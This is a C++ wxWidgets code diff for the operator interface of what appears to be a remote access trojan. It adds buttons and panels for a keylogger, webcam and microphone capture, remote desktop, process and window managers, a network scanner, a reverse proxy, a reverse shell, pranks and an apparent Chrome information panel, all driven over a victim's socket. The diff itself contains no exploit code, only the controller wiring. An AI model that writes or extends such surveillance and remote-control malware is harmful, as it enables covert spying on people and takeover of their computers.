@@ -21,6 +21,15 @@ extern std::mutex vector_mutex;
 
 wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
     EVT_CLOSE(FrameCliente::OnClose)
+    EVT_BUTTON(EnumFrameIDS::BTN_Keylogger, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Ventanas, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Adm_Procesos, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Informacion, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Escaner, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Remote_Desktop, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Iniciar, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Proxy_Detener, FrameCliente::OnButton)
+    EVT_BUTTON(EnumFrameIDS::BTN_Limpiar_Log, FrameCliente::OnButton)
     EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
 wxEND_EVENT_TABLE()
 
@@ -28,9 +37,16 @@ wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
     EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
 wxEND_EVENT_TABLE()
 
-FrameCliente::FrameCliente()
-    :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, "Titulo", wxDefaultPosition, wxSize(WIN_WIDTH, WIN_HEIGHT), wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)) {
+FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _strIP)
+    :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, _strID, wxDefaultPosition, wxSize(WIN_WIDTH, WIN_HEIGHT), wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)) {
     
+    wxString strTitle = "[";
+    strTitle.append(_strID.c_str());
+    strTitle.append("] - Admin");
+    this->SetTitle(strTitle);
+
+    this->sckCliente = _sckSocket;
+
     //////////////////////////////////////////////////
     //Administrador de archivos
     //////////////////////////////////////////////////
@@ -39,7 +55,7 @@ FrameCliente::FrameCliente()
 
     //pnl_AdminArchivos->SetBackgroundColour(wxColour(100, 100, 100));
     
-    box_admin->Add(new panelFileManager(pnl_AdminArchivos, INVALID_SOCKET, "ID", "127.0.0.1"), 0, wxALL | wxEXPAND);
+    box_admin->Add(new panelFileManager(pnl_AdminArchivos, this->sckCliente, _strID, _strIP), 0, wxALL | wxEXPAND);
     
     pnl_AdminArchivos->SetSizer(box_admin);
     //////////////////////////////////////////////////
@@ -52,13 +68,21 @@ FrameCliente::FrameCliente()
     wxPanel* pnl_Monitoreo = new wxPanel(this, wxID_ANY, wxDefaultPosition);
     wxStaticBoxSizer* box_monitoreo = new wxStaticBoxSizer(wxVERTICAL, pnl_Monitoreo, "Monitoreo");
 
-    //pnl_Monitoreo->SetBackgroundColour(wxColour(100, 100, 100));
-    
-    wxStaticText* lbl1 = new wxStaticText(pnl_Monitoreo, wxID_ANY, "Label");
-    wxButton* btn_1 = new wxButton(pnl_Monitoreo, wxID_ANY, "Test");
+    wxBoxSizer* box_btns_2 = new wxBoxSizer(wxHORIZONTAL);
+    wxButton* btn_Keylogger = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Keylogger, "Keylogger");
+    //btn_Keylogger->SetBitmap(wxBitmap(wxT("./keylogger.png"), wxBITMAP_TYPE_PNG));
+   
 
-    box_monitoreo->Add(lbl1, 0);
-    box_monitoreo->Add(btn_1, 0, wxALL | wxEXPAND);
+    wxButton* btn_Camara = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Camara, "Camara");
+    //btn_Camara->SetBitmap(wxBitmap(wxT("./webcam.png"), wxBITMAP_TYPE_PNG));
+    
+    box_btns_2->Add(btn_Keylogger, 1, wxALL | wxEXPAND);
+    box_btns_2->Add(btn_Camara, 1, wxALL | wxEXPAND);
+
+    box_monitoreo->Add(new panelMicrophone(pnl_Monitoreo, this->sckCliente), 1, wxALL | wxEXPAND);
+    box_monitoreo->AddSpacer(5);
+    box_monitoreo->Add(box_btns_2, 1, wxALL | wxEXPAND);
+
     pnl_Monitoreo->SetSizer(box_monitoreo);
     //////////////////////////////////////////////////
     //////////////////////////////////////////////////
@@ -73,12 +97,14 @@ FrameCliente::FrameCliente()
 
     //pnl_Mods->SetBackgroundColour(wxColour(50, 50, 50));
 
-    wxButton* btn_AdmVentanas = new wxButton(pnl_Mods, wxID_ANY, "Adm. Ventanas");
-    wxButton* btn_EscanerRed = new wxButton(pnl_Mods, wxID_ANY, "Escaner de Red");
-    wxButton* btn_AdmProcesos = new wxButton(pnl_Mods, wxID_ANY, "Adm. Procesos");
-    wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, wxID_ANY, "Escritorio Remoto");
-    wxButton* btn_Informacion = new wxButton(pnl_Mods, wxID_ANY, "Informacion");
-    wxButton* btn_Bromas = new wxButton(pnl_Mods, wxID_ANY, "Bromas");
+    wxButton* btn_AdmVentanas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Ventanas, "Adm. Ventanas");
+    wxButton* btn_EscanerRed = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Escaner, "Escaner de Red");
+    //btn_EscanerRed->SetBitmap(wxBitmap(wxT("./scan.png"), wxBITMAP_TYPE_PNG));
+    wxButton* btn_AdmProcesos = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Procesos, "Adm. Procesos");
+    wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Remote_Desktop, "Escritorio Remoto");
+    wxButton* btn_Informacion = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Informacion, "Informacion");
+    wxButton* btn_Bromas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Fun, "Bromas");
+    //btn_Bromas->SetBitmap(wxBitmap(wxT("./prank.png"), wxBITMAP_TYPE_PNG));
 
     wxGridSizer* btnGrid = new wxGridSizer(3, 2, 5, 5);
     btnGrid->Add(btn_AdmVentanas, 1, wxALL | wxEXPAND);
@@ -104,10 +130,12 @@ FrameCliente::FrameCliente()
 
     //pnl_Proxy->SetBackgroundColour(wxColour(150, 150, 150));
 
-    box_proxy->Add(new wxStaticText(pnl_Proxy, wxID_ANY, "Puerto local"), 0, wxALL | wxEXPAND);
+    box_proxy->Add(new panelReverseProxy(pnl_Proxy, this->sckCliente), 1, wxALL | wxEXPAND);
+
+    /*box_proxy->Add(new wxStaticText(pnl_Proxy, wxID_ANY, "Puerto local"), 0, wxALL | wxEXPAND);
     box_proxy->Add(new wxTextCtrl(pnl_Proxy, wxID_ANY, "8080"), 0, wxALL | wxEXPAND);
-    box_proxy->Add(new wxButton(pnl_Proxy, wxID_ANY, "Iniciar"), 0, wxALL | wxEXPAND);
-    box_proxy->Add(new wxButton(pnl_Proxy, wxID_ANY, "Detener"), 0, wxALL | wxEXPAND);
+    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Iniciar, "Iniciar"), 0, wxALL | wxEXPAND);
+    box_proxy->Add(new wxButton(pnl_Proxy, EnumFrameIDS::BTN_Proxy_Detener, "Detener"), 0, wxALL | wxEXPAND);*/
 
     pnl_Proxy->SetSizer(box_proxy);
     //////////////////////////////////////////////////
@@ -219,7 +247,7 @@ FrameCliente::FrameCliente()
     
     log_sizer->Add(txtLog, 0, wxALL | wxEXPAND);
     log_sizer->AddSpacer(5);
-    log_sizer->Add(new wxButton(pnl_LogRemoto, wxID_ANY, "Limpiar log"), 0, wxALL | wxEXPAND);
+    log_sizer->Add(new wxButton(pnl_LogRemoto, EnumFrameIDS::BTN_Limpiar_Log, "Limpiar log"), 0, wxALL | wxEXPAND);
 
     pnl_LogRemoto->SetSizer(log_sizer);
 
@@ -257,11 +285,26 @@ FrameCliente::FrameCliente()
     
     wxStaticBoxSizer* bottom_sizer = new wxStaticBoxSizer(wxVERTICAL, bottom_Panel, "Shell Inversa");
 
-    wxBoxSizer* controls_sizer = new wxBoxSizer(wxHORIZONTAL);
+    //wxBoxSizer* controls_sizer = new wxBoxSizer(wxHORIZONTAL);
+
+    panelReverseShell* panelShell = new panelReverseShell(bottom_Panel, this->sckCliente);
+
+    bottom_sizer->Add(panelShell, 1, wxALL | wxEXPAND);
+
+   /* 
     wxStaticText* lblShell = new wxStaticText(bottom_Panel, wxID_ANY, "Shell:");
+    wxComboBox* cmb_shells = new wxComboBox(bottom_Panel, wxID_ANY, "", wxDefaultPosition, wxDefaultSize);
+    wxButton* btn_exec = new wxButton(bottom_Panel, wxID_ANY, "Exec", wxDefaultPosition, wxDefaultSize);
+    wxButton* btn_stop = new wxButton(bottom_Panel, wxID_ANY, "Stop", wxDefaultPosition, wxDefaultSize);
+
+    controls_sizer->Add(lblShell, 0);
+    controls_sizer->Add(cmb_shells, 0);
+    controls_sizer->Add(btn_exec, 0);
+    controls_sizer->Add(btn_stop, 0);
+
 
     bottom_sizer->Add(controls_sizer, 0, wxALL | wxEXPAND);
-    bottom_sizer->Add(new wxTextCtrl(bottom_Panel, wxID_ANY, "C:\\\n\n\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE), 1, wxALL | wxEXPAND);
+    bottom_sizer->Add(new wxTextCtrl(bottom_Panel, wxID_ANY, "C:\\\n\n\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE), 1, wxALL | wxEXPAND);*/
 
     bottom_Panel->SetSizer(bottom_sizer);
 
@@ -389,6 +432,38 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
         p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
     }
     event.Skip();
+}
+
+void FrameCliente::OnButton(wxCommandEvent& event) {
+    const int btnID = event.GetId();
+    int iComando = -1;
+
+    if (btnID == EnumFrameIDS::BTN_Keylogger) {
+        panelKeylogger* panelKey = new panelKeylogger(this, this->sckCliente);
+        panelKey->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Camara){
+        panelCamara* panelCam = new panelCamara(this, this->sckCliente);
+        panelCam->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Adm_Ventanas) {
+        panelWManager* panelVentanas = new panelWManager(this, this->sckCliente);
+        panelVentanas->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Adm_Procesos) {
+        panelProcessManager* panelProcesos = new panelProcessManager(this, this->sckCliente);
+        panelProcesos->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Informacion) {
+        panelInfoChrome* panelInfo = new panelInfoChrome(this, this->sckCliente);
+        panelInfo->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Escaner) {
+        panelEscaner* panelScaner = new panelEscaner(this, this->sckCliente);
+        panelScaner->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Remote_Desktop) {
+        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, this->sckCliente);
+        frameRemote->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Fun) {
+        panelFun* panelF = new panelFun(this, this->sckCliente);
+        panelF->Show();
+    }
+    
 }
 
 //Al hacer doble click en uno de los modulos del panel izquierdo
